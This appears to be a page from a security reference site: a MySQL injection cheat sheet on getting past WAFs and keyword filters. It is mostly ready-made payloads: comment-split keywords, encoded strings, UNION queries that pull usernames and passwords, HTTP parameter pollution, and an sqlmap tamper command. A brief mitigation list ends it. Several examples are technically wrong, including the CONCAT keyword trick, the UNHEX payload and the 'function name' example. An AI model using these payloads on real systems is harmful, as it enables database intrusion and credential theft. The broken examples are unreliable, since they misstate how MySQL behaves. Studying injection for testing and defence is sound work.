---
title: Fuzzing and Obfuscation
description: Techniques for bypassing WAFs and filters in MySQL injection
category: Advanced Techniques
order: 20
tags: ["bypass", "WAF", "obfuscation", "filter evasion"]
lastUpdated: 2025-03-15
---

## Fuzzing and Obfuscation

Modern web applications often employ Web Application Firewalls (WAFs) and other security measures to detect and block SQL injection attempts. Fuzzing and obfuscation techniques can help bypass these protections by disguising SQL injection payloads.

### Comment Variations

MySQL supports various comment styles that can be used to break up SQL keywords:

```sql
-- Standard SQL comments
SELECT/*comment*/username,password/**/FROM/**/users

-- MySQL-specific hash comment
SELECT # comment
username FROM users WHERE id = 1

-- C-style comments
SELECT /* comment */ username FROM users

-- Nested comments (MySQL specific)
SELECT /*! nested comment */ username FROM users
```

### Whitespace Manipulation

MySQL is generally flexible with whitespace, allowing creative formatting:

```sql
-- Using tabs, newlines, and carriage returns
SELECT
username
FROM
users

-- Unicode whitespace characters
SELECT%A0username%A0FROM%A0users

-- Excessive whitespace
SELECT       username       FROM       users
```

### Case Variation

MySQL keywords are case-insensitive:

```sql
select USERNAME from USERS where ID=1
SeLeCt UsErNaMe FrOm UsErS wHeRe Id=1
```

### Operator Alternatives

Many MySQL operators have alternative representations:

```sql
-- OR alternatives
1 OR 1=1
1 || 1=1
1 OR '1'='1'

-- AND alternatives
1 AND 1=1
1 && 1=1

-- Equal alternatives
id=1
id<=>1 
```

### String Representation

Strings can be represented in multiple ways:

```sql
-- Hex encoding
SELECT * FROM users WHERE username = 0x61646d696e -- 'admin' in hex

-- Using CHAR function
SELECT * FROM users WHERE username = CHAR(97, 100, 109, 105, 110) -- 'admin'

-- Concatenation
SELECT * FROM users WHERE username = CONCAT('ad', 'min')

-- Concatenation with functions
SELECT * FROM users WHERE username = CONCAT(LOWER('AD'), LOWER('MIN'))
```

### Numeric Representation

Numbers can be represented in various ways:

```sql
-- Mathematical expressions
SELECT * FROM users WHERE id = 1+0

-- Boolean conversions
SELECT * FROM users WHERE id = true+0 -- true = 1

-- Hexadecimal
SELECT * FROM users WHERE id = 0x1 -- hex for 1

-- Scientific notation
SELECT * FROM users WHERE id = 1e0
```

### Function Call Obfuscation

Function names can be obfuscated:

```sql
-- Using substrings to construct function names
SELECT * FROM users WHERE id = (SELECT 1)

-- Using prepared statements for dynamic execution
SET @x = 'SELECT * FROM users';
PREPARE stmt FROM @x;
EXECUTE stmt;
```

### UNION Query Obfuscation

UNION attacks can be obfuscated:

```sql
-- Adding redundant conditions
1 UNION SELECT 1,2,3 WHERE 1=1

-- Using NULL values
1 UNION SELECT NULL,NULL,(SELECT username FROM users LIMIT 1)

-- Nested UNIONs
1 UNION (SELECT * FROM (SELECT 1,2,3)x)
```

### Advanced MySQL-specific Bypasses

#### Using Information Schema

```sql
-- Alternative to 'users' table name
SELECT * FROM (SELECT table_name FROM information_schema.tables WHERE table_name LIKE 0x7573657273 LIMIT 1)x -- 'users' in hex
```

#### Using MySQL Comments to Break Keywords

```sql
-- Break 'SELECT' keyword
SEL/**/ECT username FROM users

-- Break 'UNION' keyword
UNI/**/ON SEL/**/ECT 1,2,3

-- Break 'INFORMATION_SCHEMA' keyword
INF/**/ORMATION_/**/SCHEMA.tables
```

#### HTTP Parameter Pollution

Some WAFs can be bypassed by splitting the payload across multiple parameters:

```
?id=1/*&id=*/UNION/*&id=*/SELECT/*&id=*/1,2,3
```

### Practical Examples

#### Bypassing Simple Keyword Filters

If 'SELECT' is blocked:

```sql
-- Using MySQL version-specific comment
/*!50000 SELECT */ username FROM users

-- Using character obfuscation
CONCAT('SEL','ECT') username FROM users
```

#### Bypassing WAF Pattern Recognition

If basic injection patterns are blocked:

```sql
-- Complex nested logic
1 AND NOT 1=2 UNION ALL SELECT (CASE WHEN (1=1) THEN username ELSE password END), 2 FROM users

-- Mixing encoding techniques
1 AND 0x1=0x1 UNION SELECT UNHEX('73656C65637420757365726E616D652066726F6D20757365727320')
```

### Automated Fuzzing

Tools like SQLMap include fuzzing capabilities to automatically test various bypass techniques:

```
sqlmap --url="http://target/page.php?id=1" --tamper=space2comment,charencode --random-agent
```

### Mitigation

To protect against obfuscation techniques:

1. Use parameterized queries instead of string concatenation
2. Implement a WAF with updated signatures
3. Use positive security models (whitelist valid patterns)
4. Limit the database user's privileges
5. Monitor and rate-limit suspicious queries
6. Use security testing tools to validate protections
